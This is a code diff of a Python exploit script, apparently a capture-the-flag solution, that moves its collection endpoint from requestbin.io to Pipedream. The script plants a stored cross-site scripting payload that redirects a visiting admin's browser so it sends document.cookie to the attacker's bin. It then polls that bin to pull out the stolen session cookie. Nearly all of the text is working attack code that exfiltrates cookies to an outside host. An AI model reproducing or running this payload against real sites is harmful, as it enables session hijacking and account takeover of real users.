@@ -12,13 +12,15 @@ else:
     URL = sys.argv[1].strip("/")
 
 # Create a post bin to store the admin's request
-res = requests.post("https://requestbin.io/api/v1/bins")
-bin_id = res.json()["name"]
+res = requests.post("https://requestbin-api.pipedream.com/api/v2/http_endpoints")
+bin_id = res.json()["data"]["api_key"]
 print(f"[+] Create post bin ID {bin_id}")
+
+time.sleep(5)
 
 # Create the XSS payload to steal the cookie
 payload = (
-    f'<script>location="https://requestbin.io/{bin_id}?c="+document.cookie</script>'
+    f'<script>location="https://{bin_id}.x.pipedream.net/?c="+document.cookie</script>'
 )
 
 ses = requests.session()
@@ -37,8 +39,8 @@ print(f"[+] Admin is visiting XSS payload")
 # Retrive the leaked data from postbin
 for i in range(10):
     time.sleep(2)
-    res = requests.get(f"https://requestbin.io/{bin_id}?inspect")
-    cookie_search = re.search(r"<strong>c:</strong>\s+([a-zA-Z0-9_=-]+)</p>", res.text)
+    res = requests.get(f"https://requestbin-api.pipedream.com/api/v2/events/{bin_id}")
+    cookie_search = re.search(r"/\?c=([a-zA-Z0-9_=-]+)", res.text)
     if cookie_search:
         break
     print(f"[!] No request captured, waiting...")
